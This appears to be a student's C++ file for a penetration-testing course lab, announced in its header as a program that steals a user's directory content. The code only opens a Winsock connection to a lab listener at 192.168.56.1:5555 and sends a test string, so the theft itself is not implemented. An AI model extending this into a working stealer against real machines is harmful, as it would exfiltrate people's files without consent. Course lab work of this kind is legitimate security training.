/*
CJ Pfenninger
06/03/2020
www.elearnsecurity.com
Pentest Student Course, eJPT Certification
C++ Programming Lab, Task 1: Create a simple program that steals a user's directory content.
To compile:
    g++ dirstealer.cpp -o dirstealer.exe -lws2_32
*/
#define _WIN32_WINNT 0x501

#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>

#define DEFAULT_PORT "5555"
#define DEFAULT_SERVER "192.168.56.1"
#define DEFAULT_BUFLEN 512

using namespace std;

int main(int argc, char* argv[])
{
    WSADATA wsaData;

    int iResult;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        cout << "WSAStartup failed: " << iResult << endl;
        return 1;
    }
    cout << "WSAStartup Success!" << endl;

    // Create TCP socket stream.
    struct addrinfo* result = NULL,
        * ptr = NULL,
        hints;

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    // getaddrinfo is used to determine the values in the sockaddr structure.
    // The information in the sockaddr structure includes IP address of the server to connect to and the port number to use for that connection.
    iResult = getaddrinfo(DEFAULT_SERVER, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        cout << "getaddrinfo failed: " << iResult << endl;
        // WSACleanup is used to terminate the use of the WS2_32 DLL.
        WSACleanup();
        return 1;
    }
    
    SOCKET ConnectSocket = INVALID_SOCKET;

    // Attempt to connect to the first address returned by the call to getaddrinfo
    ptr = result;

    // Create a socket for connecting to the server
    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

    // Check for errors to ensure valid socket 
    if (ConnectSocket == INVALID_SOCKET) {
        // WSAGetLastError returns an error number associated with the last error that occurred.
        cout << "Error at socket(): " << WSAGetLastError() << endl;
        freeaddrinfo(result);
        WSACleanup();
        return 1;
    }

    // To connect to a socket, call the connect function and pass in the created socket and the sockaddr structure.
    // Connect to a server
    iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
    if (iResult == SOCKET_ERROR) {
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        cout << "Unable to connect to server" << endl;
        WSACleanup();
        return 1;
    }

    // Sending and Receiving Data
    // send and recv both return an interger value of the number of bytes sent/received, or an error. 
    // These both take the same parameters; the active socket, number of bytes to send/receieve, and any flags to use.
    int recvbuflen = DEFAULT_BUFLEN;

    const char* sendbuf = "this is a test";
    char recvbuf[DEFAULT_BUFLEN];

    // Send an initial buffer
    iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
    if (iResult == SOCKET_ERROR) {
        cout << "send failed: " << WSAGetLastError() << endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    cout << "Bytes sent: " << iResult << endl;

    // Shut down the connection for sending since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        cout << "Shutdown failed: " << WSAGetLastError() << endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    return 0;
}